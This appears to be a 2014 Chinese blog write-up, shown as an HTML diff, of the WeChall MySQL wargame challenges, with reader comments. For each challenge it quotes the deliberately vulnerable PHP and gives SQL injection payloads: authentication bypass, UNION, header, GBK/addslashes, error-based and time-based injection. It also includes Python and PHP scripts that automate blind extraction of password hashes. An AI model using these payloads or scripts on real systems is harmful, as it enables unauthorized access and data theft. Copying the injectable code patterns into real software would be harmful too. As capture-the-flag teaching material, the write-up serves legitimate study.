@@ -1,0 +1,392 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">wechall mysql关卡题解</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">蓝蓝</a> <span class="bull">·</span> <time title="2014/03/26 18:01" ui-time="" datetime="2014/03/26 18:01" class="published ng-binding ng-isolate-scope">2014/03/26 18:01</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>特别鸣谢 Random Debug Slipper 对我的无私帮助</p><p>PS:虽然是一份题解，但是其中某些题目的解法还有些不尽人意。如有更好的思路欢迎留言评论 :)</p><p>QQ:915910623</p><h2>Training: MySQL I</h2><hr><p>最简单的注入情况，参数没有经过任何过滤就带入查询</p><p>漏洞代码：</p><pre><code>#!php
+function auth1_onLogin(WC_Challenge $chall, $username, $password)
+{
+        $db = auth1_db();
+
+        $password = md5($password);
+
+        $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+
+        if (false === ($result = $db-&gt;queryFirst($query))) {
+                echo GWF_HTML::error('Auth1', $chall-&gt;lang('err_unknown'), false); # Unknown user
+                return false;
+        }
+
+        # Welcome back!
+        echo GWF_HTML::message('Auth1', $chall-&gt;lang('msg_welcome_back', htmlspecialchars($result['username'])), false);
+
+        # Challenge solved?
+        if (strtolower($result['username']) === 'admin') {
+                $chall-&gt;onChallengeSolved(GWF_Session::getUserID());
+        }
+
+        return true;
+}
+</code></pre><p>利用语句：</p><pre><code>username=admin' -- 
+</code></pre><h2>MySQL Authentication Bypass II</h2><hr><p>比较基础的题目，和上一题不同，username password分开来验证。通常的利用方法是使用union构造已知MD5值的查询。</p><p>漏洞代码：</p><pre><code>#!php
+function auth2_onLogin(WC_Challenge $chall, $username, $password)
+{
+        $db = auth2_db();
+
+        $password = md5($password);
+
+        $query = "SELECT * FROM users WHERE username='$username'";
+
+        if (false === ($result = $db-&gt;queryFirst($query))) {
+                echo GWF_HTML::error('Auth2', $chall-&gt;lang('err_unknown'), false);
+                return false;
+        }
+
+
+        #############################
+        ### This is the new check ###
+        if ($result['password'] !== $password) {
+                echo GWF_HTML::error('Auth2', $chall-&gt;lang('err_password'), false);
+                return false;
+        } #  End of the new code  ###
+        #############################
+
+
+        echo GWF_HTML::message('Auth2', $chall-&gt;lang('msg_welcome_back', array(htmlspecialchars($result['username']))), false);
+
+        if (strtolower($result['username']) === 'admin') {
+                $chall-&gt;onChallengeSolved(GWF_Session::getUserID());
+        }
+
+        return true;
+}
+</code></pre><p>利用语句:</p><pre><code>username=wyl' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b' --  &amp;password=1&amp;login=Login
+</code></pre><p>也可以直接使用mysql自带的 MD5 函数来生成 hash</p><pre><code>username=wyl' union select 1,'admin',md5('1') --  &amp;password=1&amp;login=Login
+</code></pre><h2>No Escape</h2><hr><p>一个投票的功能，使用<code>mysql_real_escape_string()</code> 对参数进行了过滤，不过并不需要绕过它，因为它并不会过滤重音符（backtick）</p><p>漏洞代码：</p><pre><code>#!php
+function noesc_voteup($who)
+{
+        if ( (stripos($who, 'id') !== false) || (strpos($who, '/') !== false) ) {
+                echo GWF_HTML::error('No Escape', 'Please do not mess with the id. It would break the challenge for others', false);
+                return;
+        }
+
+
+        $db = noesc_db();
+        $who = mysql_real_escape_string($who);
+        $query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
+        if (false !== $db-&gt;queryWrite($query)) {
+                echo GWF_HTML::message('No Escape', 'Vote counted for '.GWF_HTML::display($who), false);
+        }
+
+        noesc_stop100();
+}
+</code></pre><p>利用方式：</p><pre><code>vote_for=bill` = `bill` %2b 111 where bill=0 --%20
+</code></pre><p>当然也可以写的简短一点</p><pre><code>barack`=111#
+</code></pre><h2>The Guestbook</h2><hr><p>一个留言本的程序，其中大部分参数都经过了过滤，但是IP地址直接带入insert语句，可以构造一个x-forwraded-for来实现注入</p><p>需要在insert语句中使用select子查询</p><p>漏洞代码：</p><pre><code>#!php
+function gbook_getIP()
+{
+        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+                return $_SERVER['HTTP_X_FORWARDED_FOR'];
+        }
+        elseif (isset($_SERVER['HTTP_VIA'])) { 
+                return $_SERVER['HTTP_VIA'];
+        }
+        else {
+                return $_SERVER['REMOTE_ADDR'];
+        }
+}
+</code></pre><p>利用方式：</p><p>头中不能使用urlencode，末尾空格会被会忽略</p><pre><code>X-Forwarded-For: 127.0.0.1,8888',(select gbu_password from gbook_user where gbu_name='admin')) #
+</code></pre><p>如果非要使用--也可以这样构造</p><pre><code>X-Forwarded-For: 127.0.0.1,8888',(select gbu_password from gbook_user where gbu_name='admin')) -- a
+</code></pre><h2>MD5.SALT</h2><hr><p>这道题是一道简单的注入，不过需要破解MD5，在网站上付费一下就可以了。</p><p>漏洞代码：</p><p>题目没有给出源代码</p><p>利用方式：</p><pre><code>' union select password,2 from users -- 
+</code></pre><h2>Addslashes</h2><hr><p>这题的参数使用了Addslashes()函数进行了过滤，使用双字节绕过即可。</p><p>漏洞代码：</p><pre><code>#!php
+function asvsmysql_login($username, $password)
+{
+        $username = addslashes($username);
+        $password = md5($password);
+
+        if (false === ($db = gdo_db_instance('localhost', ADDSLASH_USERNAME, ADDSLASH_PASSWORD, ADDSLASH_DATABASE, GWF_DB_TYPE, 'GBK'))) {
+                return htmlDisplayError('Can`t connect to database.');
+        }
+
+        $db-&gt;setLogging(false);
+        $db-&gt;setEMailOnError(false);
+
+        $query = "SELECT username FROM users WHERE username='$username' AND password='$password'";
+
+        if (false === ($result = $db-&gt;queryFirst($query))) {
+                return htmlDisplayError('Wrong username/password.');
+        }
+
+        if ($result['username'] !== 'Admin') {
+                return htmlDisplayError('You are logged in, but not as Admin.');
+        }
+
+        return htmlDisplayMessage('You are logged in. congrats!');
+}
+</code></pre><p>利用方式：</p><p>使用limit猜测一下，admin的位置</p><pre><code>username=Admin%bf' union select username from users limit 1,1 -- 
+</code></pre><p>或者直接构造一个admin出来</p><pre><code>username=%b3%27+union+select+Char(65,100,109,105,110)/*
+</code></pre><p>当然这些方法，主要是为了绕过单引号，还有一些有趣的利用</p><pre><code>username=%bf%27 OR CONV(username,36,10) = 17431871#
+</code></pre><h2>Blinded by the light</h2><hr><p>盲注，参数没用经过过滤，猜测一个32位的hash，但是要求在128次之内猜解出来，使用二分即可。</p><p>漏洞代码：</p><pre><code>#!php
+function blightVuln($password)
+{
+        # Do not mess with other sessions!
+        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
+        {
+                return false;
+        }
+
+        $db = blightDB();
+        $sessid = GWF_Session::getSession()-&gt;getID();
+        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
+        return $db-&gt;queryFirst($query) !== false;
+}
+</code></pre><p>利用脚本：</p><p>常规的二分盲注</p><pre><code>#!python
+import urllib
+import urllib2
+def doinject(payload):
+    url = 'http://www.wechall.net/challenge/blind_light/index.php'
+    values = {'injection':payload,'inject':'Inject'}
+    data = urllib.urlencode(values)
+    #print data
+    req = urllib2.Request(url, data)
+    req.add_header('cookie','WC=7205526-10787-ZSOZPXjj8gf4BE7K')
+    response = urllib2.urlopen(req)
+    the_page = response.read()
+    if (the_page.find("Welcome back")&gt;0):
+        return True
+    else:
+        return False
+
+
+wordlist = "0123456789ABCDEF"
+res = ""
+for i in range(1,33):
+    s=0
+    t=15
+    while (s&lt;t):
+        if (t-s==1):
+            if doinject('\' or substring(password,'+str(i)+',1)=\''+wordlist[t]+'\' -- '):
+                m=t
+                break
+            else:
+                m=s
+                break
+        m=(s+t)/2
+        if doinject('\' or substring(password,'+str(i)+',1)&gt;\''+wordlist[m]+'\' -- '):
+            s=m+1
+            print wordlist[s]+":"+wordlist[t]
+        else:
+            t=m
+            print wordlist[s]+":"+wordlist[t]
+    res = res+wordlist[m]
+    print res
+</code></pre><p>使用正则表达式的盲注</p><pre><code>#!php
+$sUrl = 'http://www.wechall.net/challenge/blind_light/index.php';
+$sPost = 'inject=Inject&amp;injection=';
+$sCharset = 'ABCDEF0123456789';
+
+
+/* for every character */
+for ($i=0, $hash=''; $i&lt;32; ++$i) {
+        $ch = $sCharset;
+
+        do {
+                $ch1 = substr($ch, 0, intval(strlen($ch)/2));
+                $ch2 = substr($ch, intval(strlen($ch)/2));
+
+                $p = $sPost.'absolutelyimpossible\' OR 1=(SELECT 1 FROM blight WHERE password REGEXP \'^'.$hash.'['.$ch1.']\' AND sessid=xxx) AND \'1\'=\'1';
+                $res = libHTTP::POST($sUrl, $p);
+
+                if (strpos($res['content'], 'Your password is wrong') === false)
+                        $ch = $ch1;
+                else 
+                        $ch = $ch2;
+
+        } while (strlen($ch) &gt; 1);
+
+        $hash .= $ch;
+        echo "\rhash: ".$hash;
+}
+</code></pre><h2>Blinded by the lighter</h2><hr><p>这题和上题相同，只不过把次数减少成为33次</p><p>漏洞代码：</p><pre><code>#!php
+function blightVuln($password)
+{
+        # Do not mess with other sessions!
+        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
+        {
+                return false;
+        }
+
+        $db = blightDB();
+        $sessid = GWF_Session::getSessSID();
+        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
+        return $db-&gt;queryFirst($query) !== false;
+}
+</code></pre><p>利用方式：</p><p>使用基于时间的注入来判断字符ascii码</p><pre><code>' or benchmark(ord(substr(password,1,1))*1000000,MD5(1))
+</code></pre><p>这样做可以提高一点精确度</p><pre><code>' or sleep(ord(substr(password,1,1)))
+</code></pre><p>ps.这题使用这种方法写的脚本，在精度上会出现问题，如果有什么好的思路请留言告知~~~~</p><h2>Light in the Darkness</h2><hr><p>上面两题的加强版，只允许2次查询。不过是返回错误信息的盲注。可以使用双查询报错。</p><p>漏洞代码：</p><pre><code>#!php
+function blightVuln($password)
+{
+        # Do not mess with other sessions!
+        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
+        {
+                return false;
+        }
+
+        $db = blightDB();
+        $sessid = GWF_Session::getSessSID();
+        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
+        return $db-&gt;queryFirst($query) !== false;
+}
+</code></pre><p>利用方式:</p><pre><code>1' or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2))) -- 
+</code></pre><p>我其实对这种报错方式的原理很好奇，也很不解，有感兴趣的同学欢迎指教。</p><p>下面是我对这题的几点疑惑：</p><p>特别是使用用户变量时，反应也很神奇，比如这题的另一种解法，不明白其中的原理。</p><pre><code> '||(select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2))||'
+</code></pre><p>我当时设想出这样一种解法，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7296cff494eadd97fde395fcc297fef797e2d994eefb320a0a0a0a95e8f69adddf97fdd79bf1cf96caff96cee89ad5d497fde39acdeb96cad8100715">[email&#160;protected]</a>，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="937a0a377a0e0dd3ebebebeb750b3c74293c750623763e04701311762d1b7b2c247b1f38701311">[email&#160;protected]</a></p><pre><code>' or (@lanlan:=password) or (select 1 from(select count(*),concat(@lanlan,floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+</code></pre><h2>Are you blind?</h2><hr><p>这题也是一道盲注，可是不管对错返回的结果一样。可以使用order by报错的方法来盲注。</p><p>漏洞代码：</p><pre><code>#!php
+function blightVuln(WC_Challenge $chall, $password, $attempt)
+{
+        # Do not mess with other sessions!
+        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
+        {
+                return $chall-&gt;lang('mawekl_blinds_you', array($attempt));
+        }
+
+        # And please, no timing attempts!
+        if ( (stripos($password, 'benchmark') !== false) || (stripos($password, 'sleep') !== false) )
+        {
+                return $chall-&gt;lang('mawekl_blinds_you', array($attempt));
+        }
+
+        $db = blightDB();
+        $sessid = GWF_Session::getSessSID();
+        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
+        return $db-&gt;queryFirst($query) ? 
+                $chall-&gt;lang('mawekl_blinds_you', array($attempt)) :
+                $chall-&gt;lang('mawekl_blinds_you', array($attempt)) ;
+}
+</code></pre><p>利用语句：</p><pre><code>injection=' or  if(1,1,(select 1 union select 2)) = 1 -- &amp;inject=Inject
+</code></pre><h2>Order By Query</h2><hr><p>这是一个在order by后面的注入，可以直接使用双查询报错来解决。也可以使用盲注的手法猜测。</p><p>漏洞代码：</p><pre><code>#!php
+function addslash2_sort($orderby, $dir)
+{
+        if (false === ($db = addslash2_get_db())) {
+                return false;
+        }
+        static $whitelist = array(1, 3, 4, 5);
+        static $names = array(1 =&gt; 'Username', 3 =&gt; 'Apples', 4 =&gt; 'Bananas', 5 =&gt; 'Cherries');
+
+        $dir = GDO::getWhitelistedDirS($dir, 'DESC');
+
+        if (!in_array($orderby, $whitelist)) {
+                return htmlDisplayError('Error 1010101: Not in whitelist.');
+        }
+
+        $orderby = $db-&gt;escape($orderby);
+
+        $query = "SELECT * FROM users ORDER BY $orderby $dir LIMIT 10";
+        if (false === ($rows = $db-&gt;queryAll($query))) {
+                return false;
+        }
+
+        $headers = array(
+                array('#'),
+                array('Username', '1', 'ASC'),
+                array('Apples', '3', 'DESC'),
+                array('Bananas', '4', 'DESC'),
+                array('Cherries', '5', 'DESC'),
+        );
+        echo '&lt;div class="box box_c"&gt;'.PHP_EOL;
+        echo '&lt;table&gt;'.PHP_EOL;
+        echo GWF_Table::displayHeaders1($headers, GWF_WEB_ROOT.'challenge/order_by_query/index.php?by=%BY%&amp;dir=%DIR%');
+        $i = 1;
+        foreach ($rows as $row)
+        {
+                echo GWF_Table::rowStart();
+                echo sprintf('&lt;td align="right"&gt;%d&lt;/td&gt;', $i++);
+                echo sprintf('&lt;td&gt;%s&lt;/td&gt;', $row['username']);
+                echo sprintf('&lt;td align="right"&gt;%s&lt;/td&gt;', $row['apples']);
+                echo sprintf('&lt;td align="right"&gt;%s&lt;/td&gt;', $row['bananas']);
+                echo sprintf('&lt;td align="right"&gt;%s&lt;/td&gt;', $row['cherries']);
+                echo GWF_Table::rowEnd();
+        }
+        echo '&lt;/table&gt;'.PHP_EOL;
+        echo '&lt;/div&gt;'.PHP_EOL;
+}
+</code></pre><p>利用方式：</p><pre><code>by=5 and (select 1 from(select count(*),concat((select password from users where username=0x41646d696e),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)a) --
+</code></pre><p>盲注脚本</p><pre><code>#!php
+&lt;?php
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_COOKIE, 'WC4_SID=xxxxxxxxxxxxxxxxxxxxxxx');
+$charset = 'ABCDEF0123456789';
+$hash = '';
+for($i=0;$i&lt;32;$i++)
+{
+        $strona = '';
+        $index=0;
+        for($j=0;strpos($strona,'10&lt;/td&gt;&lt;td&gt;Admin') === false;$j++)
+        {
+                curl_setopt($curl, CURLOPT_URL, 'http://www.wechall.net/challenge/order_by_query/index.php?by=3,%20CASE%20username%20WHEN%200x41646d696e%20THEN%202-%28password%20REGEXP%200x5e'.$hash.dechex(ord($charset[$index++])).'%29%20ELSE%202%20END--');
+                $strona = curl_exec ($curl);
+        }
+        $hash .= ''.dechex(ord($charset[--$index]));
+}
+curl_close($curl);
+echo $hash;
+?&gt;
+</code></pre><h2>Table Names</h2><hr><p>猜测表名和数据库名的题目，直接查询information_schema即可</p><p>漏洞代码：</p><p>没有给出源代码</p><p>利用方式：</p><p>得到表名</p><pre><code>username=wyl' union select 1,2,table_name from information_schema.columns where column_name='username' limit 1,1 -- 
+</code></pre><p>得到数据库名</p><pre><code>username=wyl' union select 1,2,database() -- 
+</code></pre><h2>Table Names II</h2><p>这道题同样是猜测，数据库名和表名，不过很多关键词都被过滤了。查到mysql的版本，根据文档找information_schema里面的表， 一个一个试一下就行了。</p><p>漏洞代码：</p><pre><code>#!php
+&lt;?php
+$secret = require('secret.php');
+chdir('../../../');
+define('GWF_PAGE_TITLE', 'Table Names II');
+require_once('challenge/html_head.php');
+require(GWF_CORE_PATH.'module/WeChall/solutionbox.php');
+
+if (false === ($chall = WC_Challenge::getByTitle(GWF_PAGE_TITLE)))
+{
+        $chall = WC_Challenge::dummyChallenge(GWF_PAGE_TITLE, 6, 'challenge/nurfed/more_table_names/index.php', $secret['flag']);
+}
+$chall-&gt;showHeader();
+$chall-&gt;onCheckSolution();
+
+if (false !== Common::getGet('login'))
+{
+        $username = Common::getGetString('username', '');
+        $password = Common::getGetString('password', '');
+
+        if (preg_match('/statistics|tables|columns|table_constraints|key_column_usage|partitions|schema_privileges|schemata|database|schema\(\)/i', $username.$password))
+        {
+                echo GWF_HTML::error(GWF_PAGE_TITLE, $chall-&gt;lang('on_match'));
+        }
+        else
+        {
+                if (false === ($db = gdo_db_instance($secret['host'], $secret['username'], $secret['password'], $secret['database'])))
+                {
+                        die('Database error.');
+                }
+
+                $db-&gt;setVerbose(false);
+                $db-&gt;setLogging(false);
+                $db-&gt;setEMailOnError(false);
+
+
+                $query = "SELECT * FROM {$secret['database']}.{$secret['table_name']} WHERE username='$username' AND password='$password'";
+                if (false === ($result = ($db-&gt;queryFirst($query, false))))
+                {
+                        echo GWF_HTML::error(GWF_PAGE_TITLE, $chall-&gt;lang('on_login_fail'));
+                }
+                else
+                {
+                        echo GWF_HTML::message(GWF_PAGE_TITLE, $chall-&gt;lang('on_logged_in', array(GWF_HTML::display($result['username']), GWF_HTML::display($result['message']))));
+                }
+        }
+}
+
+?&gt;
+&lt;div class="box box_c"&gt;
+&lt;form action="challenge.php" method="get"&gt;
+&lt;div&gt;&lt;?php echo $chall-&gt;lang('username'); ?&gt;: &lt;input type="text" name="username" value="" /&gt;&lt;/div&gt;
+&lt;div&gt;&lt;?php echo $chall-&gt;lang('password'); ?&gt;: &lt;input type="text" name="password" value="" /&gt;&lt;/div&gt;
+&lt;div&gt;&lt;input type="submit" name="login" value="&lt;?php echo $chall-&gt;lang('login'); ?&gt;" /&gt;&lt;/div&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;?php
+echo $chall-&gt;copyrightFooter();
+require_once('challenge/html_foot.php');
+</code></pre><p>利用方式：</p><pre><code>' union select 1,2,info from information_schema.processlist-- -
+</code></pre><h2>Credit Card Challenge Pwned!</h2><hr><p>这题描述特别长，看了半天就是发送一个页面给管理员，csrf+injection。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/660" rel="bookmark" id="re1">php4fun.sinaapp.com PHP挑战通关攻略</a></li><li><a href="http://drops.wooyun.org/tips/3939" rel="bookmark" id="re2">Mongodb注入攻击</a></li><li><a href="http://drops.wooyun.org/papers/850" rel="bookmark" id="re3">Attacking MongoDB</a></li><li><a href="http://drops.wooyun.org/papers/4834" rel="bookmark" id="re4">RansomWeb:一种新兴的web安全威胁</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1c3z</span> <span class="reply-time">2014-09-26 17:03:51</span></div><p></p><p>@蓝蓝<br>关于concat(password,floor(rand(0)*2)))报错<br>看这里：http://segmentfault.com/q/1010000000609508</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">leelei</span> <span class="reply-time">2014-04-25 09:56:09</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">皮皮虾</span> <span class="reply-time">2014-03-30 23:08:31</span></div><p></p><p>大哥哥帮你撑腰，谁欺负你找大哥哥打他</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">koohik</span> <span class="reply-time">2014-03-29 11:44:59</span></div><p></p><p>Mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">abaddon</span> <span class="reply-time">2014-03-28 22:18:16</span></div><p></p><p>睡觉后手机看 先做个标记</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mody</span> <span class="reply-time">2014-03-27 09:00:23</span></div><p></p><p>mark下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">某个路人</span> <span class="reply-time">2014-03-26 23:05:24</span></div><p></p><p>感谢放出题解</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">saline</span> <span class="reply-time">2014-03-26 22:46:49</span></div><p></p><p>炫酷...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-03-26 19:09:05</span></div><p></p><p>蓝蓝妹子</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Coffee</span> <span class="reply-time">2014-03-26 18:42:41</span></div><p></p><p>这个有意思。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">/fd</span> <span class="reply-time">2014-03-26 18:40:12</span></div><p></p><p>好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪头子</span> <span class="reply-time">2014-03-26 18:11:45</span></div><p></p><p>酷炫</p><p></p></div></div></div></div></div></main>
